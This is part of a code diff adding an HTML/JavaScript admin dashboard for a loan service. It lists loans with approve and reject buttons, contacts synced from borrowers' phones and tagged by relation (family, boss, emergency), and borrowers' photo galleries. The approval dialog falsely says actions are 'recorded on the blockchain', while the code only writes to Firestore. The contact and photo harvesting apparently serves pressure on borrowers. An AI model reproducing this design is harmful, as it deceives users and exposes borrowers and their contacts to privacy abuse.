+                            <div class="text-xs text-gray-400 font-mono mt-0.5 truncate max-w-[120px]">${escapeHTML(loan.userId)}</div>
+                        </td>
+                        <td class="px-6 py-4 font-semibold text-gray-800">${formatMoney(loan.amount)}</td>
+                        <td class="px-6 py-4 whitespace-nowrap">
+                            <div class="text-gray-800 text-sm">${escapeHTML(loan.duration)}</div>
+                            <div class="text-xs text-gray-500 mt-0.5">${escapeHTML(loan.interest)} APR</div>
+                        </td>
+                        <td class="px-6 py-4">${statusBadge}</td>
+                        <td class="px-6 py-4 text-right">${actionsHtml}</td>
+                    </tr>
+                `;
+            }).join('');
+        };
+
+        window.handleLoanAction = (loanId, action, userName) => {
+            if(!auth.currentUser) return;
+
+            const title = action === 'approve' ? 'Approve Loan' : 'Reject Loan';
+            const msg = `Are you sure you want to ${action} the loan application for ${userName}? This action is recorded on the blockchain.`;
+            const btnText = action === 'approve' ? 'Approve' : 'Reject';
+            const btnColor = action === 'approve' ? 'bg-emerald-600 hover:bg-emerald-700' : 'bg-red-600 hover:bg-red-700';
+
+            window.openModal(title, msg, btnText, btnColor, async () => {
+                try {
+                    const loanRef = doc(db, 'artifacts', appId, 'public', 'data', 'loans', loanId);
+                    await updateDoc(loanRef, { status: action === 'approve' ? 'approved' : 'rejected' });
+                    
+                    showToast(`Loan successfully ${action}d for ${userName}.`, 'success');
+                } catch (error) {
+                    console.error("Error updating loan:", error);
+                    showToast(`Failed to update loan status.`, 'error');
+                }
+            });
+        };
+
+        const updateContactsUI = () => {
+            const tbody = document.getElementById('contacts-tbody');
+            if(state.contacts.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="4" class="px-6 py-8 text-center text-gray-500">No contacts synced yet.</td></tr>`;
+                return;
+            }
+
+            tbody.innerHTML = state.contacts.map(contact => {
+                let badgeColor = 'bg-gray-100 text-gray-600';
+                const rel = (contact.relation || '').toLowerCase();
+                if(rel.includes('family') || rel.includes('spouse') || rel.includes('mom') || rel.includes('dad')) badgeColor = 'bg-blue-100 text-blue-700';
+                if(rel.includes('work') || rel.includes('boss') || rel.includes('financial')) badgeColor = 'bg-purple-100 text-purple-700';
+                if(rel.includes('emergency')) badgeColor = 'bg-red-100 text-red-700';
+
+                // Look up user name
+                const owner = state.users.find(u => u.id === contact.userId);
+                const ownerName = owner ? owner.name : 'Unknown';
+
+                return `
+                    <tr class="hover:bg-gray-50 transition-colors">
+                        <td class="px-6 py-4">
+                            <div class="font-medium text-gray-800">${escapeHTML(ownerName)}</div>
+                            <div class="font-mono text-xs text-gray-500 mt-0.5 break-all">${escapeHTML(contact.userId)}</div>
+                        </td>
+                        <td class="px-6 py-4 font-medium text-gray-800">${escapeHTML(contact.contactName)}</td>
+                        <td class="px-6 py-4 text-gray-600 whitespace-nowrap">${escapeHTML(contact.contactPhone)}</td>
+                        <td class="px-6 py-4">
+                            <span class="px-2 py-1 rounded text-xs font-medium ${badgeColor} whitespace-nowrap">${escapeHTML(contact.relation || 'Unknown')}</span>
+                        </td>
+                    </tr>
+                `;
+            }).join('');
+        };
+
+        const updateGalleryUI = () => {
+            const grid = document.getElementById('gallery-grid');
+            const emptyState = document.getElementById('gallery-empty');
+            
+            const filterUserId = document.getElementById('gallery-user-filter').value;
+            let filteredGallery = state.gallery;
+            
+            if(filterUserId !== 'all') {
+                filteredGallery = filteredGallery.filter(g => g.userId === filterUserId);
+            }
+
+            // Sort by date desc
+            filteredGallery.sort((a,b) => new Date(b.ts || 0) - new Date(a.ts || 0));
+
+            if(filteredGallery.length === 0) {
+                grid.innerHTML = '';
+                emptyState.classList.remove('hidden');
+                return;
+            }
+
+            emptyState.classList.add('hidden');
+            grid.innerHTML = filteredGallery.map(item => {
+                const owner = state.users.find(u => u.id === item.userId);
+                const ownerName = owner ? owner.name : item.userId;
+
+                return `
+                    <div class="bg-white rounded-lg shadow-sm border border-gray-200 overflow-hidden group hover:shadow-md transition-shadow relative">
+                        <div class="aspect-square bg-gray-100 relative overflow-hidden">
+                            <img src="${escapeHTML(item.img)}" alt="Media" class="w-full h-full object-cover group-hover:scale-110 transition-transform duration-500" onerror="this.src='https://placehold.co/400x400/f1f5f9/94a3b8?text=Image+Lost'">
+                            <div class="absolute inset-0 bg-black bg-opacity-0 group-hover:bg-opacity-20 transition-all duration-300 flex items-center justify-center">
+                                <button class="opacity-0 group-hover:opacity-100 bg-white/90 text-gray-800 p-2 rounded-full transform scale-50 group-hover:scale-100 transition-all duration-300 backdrop-blur-sm shadow-sm hover:bg-emerald-500 hover:text-white">
+                                    <i class="ph ph-download-simple text-lg"></i>
+                                </button>
+                            </div>
+                        </div>
+                        <div class="p-2 sm:p-3">
+                            <div class="text-xs font-medium text-gray-700 truncate" title="${escapeHTML(ownerName)}">${escapeHTML(ownerName)}</div>
+                            <div class="text-[10px] text-gray-400 flex items-center mt-1"><i class="ph ph-clock mr-1"></i> ${formatDate(item.ts)}</div>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        };
+
+        document.getElementById('gallery-user-filter').addEventListener('change', updateGalleryUI);
+
+        // Start App
+        authenticateAndInit();
+
+    </script>
+</body>
+</html>
